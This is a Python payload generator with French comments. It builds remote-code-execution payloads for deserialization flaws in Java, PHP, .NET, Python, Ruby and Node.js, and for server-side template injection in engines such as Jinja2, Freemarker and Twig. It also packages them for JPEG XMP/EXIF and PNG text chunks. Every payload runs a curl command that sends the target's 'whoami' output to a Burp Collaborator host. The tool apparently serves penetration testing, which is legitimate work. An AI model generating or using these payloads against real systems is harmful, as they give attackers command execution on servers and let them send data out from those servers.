#!/usr/bin/env python3
"""
Générateur de payloads RCE utilisant ysoserial et PHPGGC
"""
import subprocess
import os
import base64
from pathlib import Path

def find_ysoserial_jar():
    """Trouve le JAR ysoserial"""
    tools_dir = Path(__file__).parent.parent / 'tools'
    
    # Chercher dans tools/ysoserial/target/
    ysoserial_dir = tools_dir / 'ysoserial'
    if ysoserial_dir.exists():
        target_dir = ysoserial_dir / 'target'
        if target_dir.exists():
            for jar_file in target_dir.glob('ysoserial-*.jar'):
                return jar_file
    
    # Chercher directement dans tools/
    for jar_file in tools_dir.glob('ysoserial*.jar'):
        return jar_file
    
    return None

def find_phpggc():
    """Trouve PHPGGC"""
    tools_dir = Path(__file__).parent.parent / 'tools'
    phpggc_path = tools_dir / 'phpggc' / 'phpggc'
    
    if phpggc_path.exists():
        return phpggc_path
    
    # Chercher dans PATH
    try:
        result = subprocess.run(['which', 'phpggc'], capture_output=True, text=True, timeout=2)
        if result.returncode == 0:
            return result.stdout.strip()
    except:
        pass
    
    return None

def generate_ysoserial_payload(gadget, command, burp_collab):
    """
    Génère un payload ysoserial
    
    Args:
        gadget: Gadget à utiliser (ex: CommonsCollections1, URLDNS)
        command: Commande à exécuter
        burp_collab: URL Burp Collaborator
    
    Returns:
        bytes: Payload sérialisé Java
    """
    jar_path = find_ysoserial_jar()
    if not jar_path:
        return None
    
    full_command = command.replace('burp_collab', burp_collab)
    
    try:
        result = subprocess.run(
            ['java', '-jar', str(jar_path), gadget, full_command],
            capture_output=True,
            timeout=10
        )
        
        if result.returncode == 0:
            return result.stdout
        else:
            return None
    except subprocess.TimeoutExpired:
        return None
    except Exception as e:
        return None

def generate_phpggc_payload(gadget, command, burp_collab):
    """
    Génère un payload PHPGGC
    
    Args:
        gadget: Gadget à utiliser (ex: Monolog/RCE1, Guzzle/RCE1)
        command: Commande à exécuter
        burp_collab: URL Burp Collaborator
    
    Returns:
        str: Payload sérialisé PHP
    """
    phpggc_path = find_phpggc()
    if not phpggc_path:
        return None
    
    full_command = command.replace('burp_collab', burp_collab)
    
    try:
        result = subprocess.run(
            ['php', '-d', 'phar.readonly=0', str(phpggc_path), gadget, full_command],
            capture_output=True,
            timeout=10
        )
        
        if result.returncode == 0:
            return result.stdout.decode('utf-8', errors='ignore')
        else:
            return None
    except subprocess.TimeoutExpired:
        return None
    except Exception as e:
        return None

def list_ysoserial_gadgets():
    """Liste tous les gadgets ysoserial disponibles"""
    jar_path = find_ysoserial_jar()
    if not jar_path:
        return []
    
    try:
        result = subprocess.run(
            ['java', '-jar', str(jar_path)],
            capture_output=True,
            timeout=5
        )
        
        gadgets = []
        for line in result.stderr.decode('utf-8', errors='ignore').split('\n'):
            if line.strip() and not line.startswith('Usage:') and not line.startswith('Y SO'):
                gadget = line.strip().split()[0] if line.strip().split() else None
                if gadget and gadget not in gadgets:
                    gadgets.append(gadget)
        return gadgets
    except:
        pass
    
    return [
        'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4',
        'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7',
        'Groovy1', 'Spring1', 'Spring2', 'URLDNS', 'Hibernate1', 'Hibernate2',
        'JBossInterceptors1', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'Jython1',
        'Myfaces1', 'Myfaces2', 'ROME', 'Vaadin1', 'Wicket1'
    ]

def list_phpggc_gadgets():
    """Liste tous les gadgets PHPGGC disponibles"""
    phpggc_path = find_phpggc()
    if not phpggc_path:
        return []
    
    try:
        result = subprocess.run(
            ['php', '-d', 'phar.readonly=0', str(phpggc_path), '-l'],
            capture_output=True,
            timeout=5
        )
        
        gadgets = []
        for line in result.stdout.decode('utf-8', errors='ignore').split('\n'):
            if line.strip() and not line.startswith('Gadget') and not line.startswith('---'):
                gadget = line.strip().split()[0] if line.strip().split() else None
                if gadget and '/' in gadget:
                    gadgets.append(gadget)
        return gadgets
    except:
        pass
    
    return [
        'Monolog/RCE1', 'Monolog/RCE2', 'Monolog/RCE3', 'Monolog/RCE4', 'Monolog/RCE5',
        'Monolog/RCE6', 'Monolog/RCE7', 'Monolog/RCE8',
        'Guzzle/RCE1', 'Guzzle/RCE2', 'Guzzle/RCE3', 'Guzzle/RCE4', 'Guzzle/RCE5',
        'Laravel/RCE1', 'Laravel/RCE2', 'Laravel/RCE3', 'Laravel/RCE4', 'Laravel/RCE5',
        'Laravel/RCE6', 'Laravel/RCE7', 'Laravel/RCE8', 'Laravel/RCE9', 'Laravel/RCE10', 'Laravel/RCE11',
        'Symfony/RCE1', 'Symfony/RCE2', 'Symfony/RCE3', 'Symfony/RCE4',
        'SwiftMailer/FW1', 'SwiftMailer/FW2', 'SwiftMailer/FW3', 'SwiftMailer/FW4',
        'ZendFramework/FD1', 'ZendFramework/RCE1', 'ZendFramework/RCE2',
        'ThinkPHP/RCE1', 'ThinkPHP/RCE2', 'ThinkPHP/RCE3',
        'CodeIgniter4/RCE1', 'CodeIgniter4/RCE2',
        'Drupal7/RCE1', 'Drupal7/RCE2',
        'Magento/FW1', 'Magento/FW2',
        'WordPress/PHAR1', 'WordPress/PHAR2',
        'Yii2/RCE1', 'Yii2/RCE2',
        'CakePHP/RCE1', 'CakePHP/RCE2'
    ]

def list_ysoserial_net_formatters():
    """Liste tous les formatters ysoserial.net disponibles"""
    exe_path = find_ysoserial_net()
    if not exe_path:
        return []
    
    try:
        result = subprocess.run(
            ['mono', str(exe_path)],
            capture_output=True,
            timeout=5
        )
        
        formatters = []
        for line in result.stderr.decode('utf-8', errors='ignore').split('\n'):
            if line.strip() and 'Formatter' in line or 'Type' in line:
                formatter = line.strip().split()[0] if line.strip().split() else None
                if formatter:
                    formatters.append(formatter)
        return formatters
    except:
        pass
    
    return [
        'BinaryFormatter', 'ObjectDataProvider', 'TypeConfuseDelegate',
        'WindowsIdentity', 'WindowsPrincipal', 'NetDataContractSerializer',
        'JsonNetFormatter', 'LosFormatter', 'SoapFormatter'
    ]

def generate_ysoserial_for_jpeg(burp_collab, gadget='CommonsCollections1'):
    """Génère un payload ysoserial pour JPEG XMP"""
    command = f"curl -H 'X-RCE-Proof: $(whoami)' http://{burp_collab}/rce-ysoserial-{gadget.lower()}"
    payload = generate_ysoserial_payload(gadget, command, burp_collab)
    
    if payload:
        return base64.b64encode(payload).decode('utf-8')
    return None

def generate_ysoserial_all_for_jpeg(burp_collab):
    """Génère tous les payloads ysoserial pour JPEG XMP"""
    gadgets = list_ysoserial_gadgets()
    results = {}
    
    for gadget in gadgets:
        payload_b64 = generate_ysoserial_for_jpeg(burp_collab, gadget)
        if payload_b64:
            results[gadget] = payload_b64
    
    return results

def generate_phpggc_for_png_text(burp_collab, gadget='Monolog/RCE1'):
    """Génère un payload PHPGGC pour PNG tEXt chunk"""
    command = f"curl -H 'X-RCE-Proof: $(whoami)' http://{burp_collab}/rce-unserialize-{gadget.replace('/', '-').lower()}"
    payload = generate_phpggc_payload(gadget, command, burp_collab)
    return payload

def generate_phpggc_all_for_png_text(burp_collab):
    """Génère tous les payloads PHPGGC pour PNG tEXt chunk"""
    gadgets = list_phpggc_gadgets()
    results = {}
    
    for gadget in gadgets:
        payload = generate_phpggc_for_png_text(burp_collab, gadget)
        if payload:
            results[gadget] = payload
    
    return results

def generate_phpggc_for_jpeg_exif(burp_collab, gadget='Monolog/RCE1'):
    """Génère un payload PHPGGC pour JPEG EXIF"""
    command = f"curl -H 'X-RCE-Proof: $(whoami)' http://{burp_collab}/rce-exif-unserialize-{gadget.replace('/', '-').lower()}"
    payload = generate_phpggc_payload(gadget, command, burp_collab)
    return payload

def generate_phpggc_all_for_jpeg_exif(burp_collab):
    """Génère tous les payloads PHPGGC pour JPEG EXIF"""
    gadgets = list_phpggc_gadgets()
    results = {}
    
    for gadget in gadgets:
        payload = generate_phpggc_for_jpeg_exif(burp_collab, gadget)
        if payload:
            results[gadget] = payload
    
    return results

def find_ysoserial_net():
    """Trouve ysoserial.net"""
    tools_dir = Path(__file__).parent.parent / 'tools'
    ysoserial_net_path = tools_dir / 'ysoserial.net' / 'ysoserial.exe'
    
    if ysoserial_net_path.exists():
        return ysoserial_net_path
    
    # Chercher directement dans tools/
    for exe_file in tools_dir.glob('ysoserial.net*.exe'):
        return exe_file
    
    return None

def generate_ysoserial_net_payload(formatter, command, burp_collab):
    """
    Génère un payload ysoserial.net (.NET)
    
    Args:
        formatter: Formatter à utiliser (ex: BinaryFormatter, ObjectDataProvider)
        command: Commande à exécuter
        burp_collab: URL Burp Collaborator
    
    Returns:
        bytes: Payload sérialisé .NET
    """
    exe_path = find_ysoserial_net()
    if not exe_path:
        return None
    
    full_command = command.replace('burp_collab', burp_collab)
    
    try:
        result = subprocess.run(
            ['mono', str(exe_path), formatter, full_command],
            capture_output=True,
            timeout=10
        )
        
        if result.returncode == 0:
            return result.stdout
        else:
            return None
    except subprocess.TimeoutExpired:
        return None
    except Exception as e:
        return None

def generate_python_pickle_payload(command, burp_collab):
    """
    Génère un payload Python pickle
    
    Args:
        command: Commande à exécuter
        burp_collab: URL Burp Collaborator
    
    Returns:
        bytes: Payload sérialisé pickle
    """
    full_command = command.replace('burp_collab', burp_collab)
    
    try:
        import pickle
        import os
        
        class RCE:
            def __reduce__(self):
                return (os.system, (full_command,))
        
        payload = pickle.dumps(RCE())
        return payload
    except Exception as e:
        return None

def generate_python_yaml_payload(command, burp_collab):
    """
    Génère un payload Python YAML (PyYAML)
    
    Args:
        command: Commande à exécuter
        burp_collab: URL Burp Collaborator
    
    Returns:
        str: Payload YAML
    """
    full_command = command.replace('burp_collab', burp_collab)
    
    yaml_payload = f'''!!python/object/apply:os.system
- "{full_command}"'''
    
    return yaml_payload

def generate_ruby_marshal_payload(command, burp_collab):
    """
    Génère un payload Ruby Marshal
    
    Args:
        command: Commande à exécuter
        burp_collab: URL Burp Collaborator
    
    Returns:
        bytes: Payload sérialisé Marshal
    """
    full_command = command.replace('burp_collab', burp_collab)
    
    # Générer un payload Ruby Marshal qui exécute system()
    ruby_code = f'''require 'base64'
code = "system('#{full_command}')"
Marshal.dump(eval(code))'''
    
    try:
        result = subprocess.run(
            ['ruby', '-e', ruby_code],
            capture_output=True,
            timeout=10
        )
        
        if result.returncode == 0:
            return result.stdout
        else:
            return None
    except Exception as e:
        return None

def generate_ruby_yaml_payload(command, burp_collab):
    """
    Génère un payload Ruby YAML
    
    Args:
        command: Commande à exécuter
        burp_collab: URL Burp Collaborator
    
    Returns:
        str: Payload YAML
    """
    full_command = command.replace('burp_collab', burp_collab)
    
    yaml_payload = f'''--- !ruby/object:Gem::Installer
    no_wrapper: true
    bin_dir: !ruby/object:RSpec::Core::Formatters::DeprecationFormatter
      output: !ruby/object:Proc {{}}
    spec_dir: !ruby/object:Proc
      call: system("{full_command}")'''
    
    return yaml_payload

def generate_nodejs_serialize_payload(command, burp_collab):
    """
    Génère un payload Node.js serialize (node-serialize)
    
    Args:
        command: Commande à exécuter
        burp_collab: URL Burp Collaborator
    
    Returns:
        str: Payload sérialisé JavaScript
    """
    full_command = command.replace('burp_collab', burp_collab)
    
    # Payload pour node-serialize avec __proto__
    payload = f'''{{"_$$ND_FUNC$$_function": "require('child_process').exec('{full_command}', function(error, stdout, stderr) {{ console.log(stdout) }})"}}'''
    
    return payload

def generate_ssti_payload(template_engine, command, burp_collab):
    """
    Génère un payload SSTI (Server-Side Template Injection)
    
    Args:
        template_engine: Moteur de template (jinja2, freemarker, velocity, twig, etc.)
        command: Commande à exécuter
        burp_collab: URL Burp Collaborator
    
    Returns:
        str: Payload SSTI
    """
    full_command = command.replace('burp_collab', burp_collab)
    
    payloads = {
        'jinja2': f'{{{{config.__class__.__init__.__globals__["os"].popen("{full_command}").read()}}}}',
        'mako': f'${{__import__("os").system("{full_command}")}}',
        'freemarker': f'<#assign ex="freemarker.template.utility.Execute"?new()> ${{ex("{full_command}")}}',
        'velocity': f'#set($x=$class.forName("java.lang.Runtime").getRuntime().exec("{full_command}"))',
        'twig': f'{{{{["/bin/sh","-c","{full_command}"]|filter("system")}}}}',
        'smarty': f'{{{{system("{full_command}")}}}}',
        'erb': f'<%= system("{full_command}") %>',
        'handlebars': f'{{{{#with "s" as |string|}}}}{{{{ "require" "child_process" "exec" "{full_command}"}}}}',
        'ejs': f'<%= global.process.mainModule.require("child_process").exec("{full_command}") %>',
    }
    
    return payloads.get(template_engine.lower(), f'{{{{ {full_command} }}}}')

def generate_ysoserial_net_for_jpeg(burp_collab, formatter='ObjectDataProvider'):
    """Génère un payload ysoserial.net pour JPEG XMP"""
    command = f"curl -H 'X-RCE-Proof: $(whoami)' http://{burp_collab}/rce-ysoserial-net-{formatter.lower()}"
    payload = generate_ysoserial_net_payload(formatter, command, burp_collab)
    
    if payload:
        return base64.b64encode(payload).decode('utf-8')
    return None

def generate_ysoserial_net_all_for_jpeg(burp_collab):
    """Génère tous les payloads ysoserial.net pour JPEG XMP"""
    formatters = list_ysoserial_net_formatters()
    results = {}
    
    for formatter in formatters:
        payload_b64 = generate_ysoserial_net_for_jpeg(burp_collab, formatter)
        if payload_b64:
            results[formatter] = payload_b64
    
    return results

def generate_python_pickle_for_png(burp_collab):
    """Génère un payload Python pickle pour PNG"""
    command = f"curl -H 'X-RCE-Proof: $(whoami)' http://{burp_collab}/rce-python-pickle"
    payload = generate_python_pickle_payload(command, burp_collab)
    
    if payload:
        return base64.b64encode(payload).decode('utf-8')
    return None

def generate_python_yaml_for_png(burp_collab):
    """Génère un payload Python YAML pour PNG"""
    command = f"curl -H 'X-RCE-Proof: $(whoami)' http://{burp_collab}/rce-python-yaml"
    return generate_python_yaml_payload(command, burp_collab)

def generate_ruby_marshal_for_png(burp_collab):
    """Génère un payload Ruby Marshal pour PNG"""
    command = f"curl -H 'X-RCE-Proof: $(whoami)' http://{burp_collab}/rce-ruby-marshal"
    payload = generate_ruby_marshal_payload(command, burp_collab)
    
    if payload:
        return base64.b64encode(payload).decode('utf-8')
    return None

def generate_ruby_yaml_for_png(burp_collab):
    """Génère un payload Ruby YAML pour PNG"""
    command = f"curl -H 'X-RCE-Proof: $(whoami)' http://{burp_collab}/rce-ruby-yaml"
    return generate_ruby_yaml_payload(command, burp_collab)

def generate_nodejs_serialize_for_png(burp_collab):
    """Génère un payload Node.js serialize pour PNG"""
    command = f"curl -H 'X-RCE-Proof: $(whoami)' http://{burp_collab}/rce-nodejs-serialize"
    return generate_nodejs_serialize_payload(command, burp_collab)

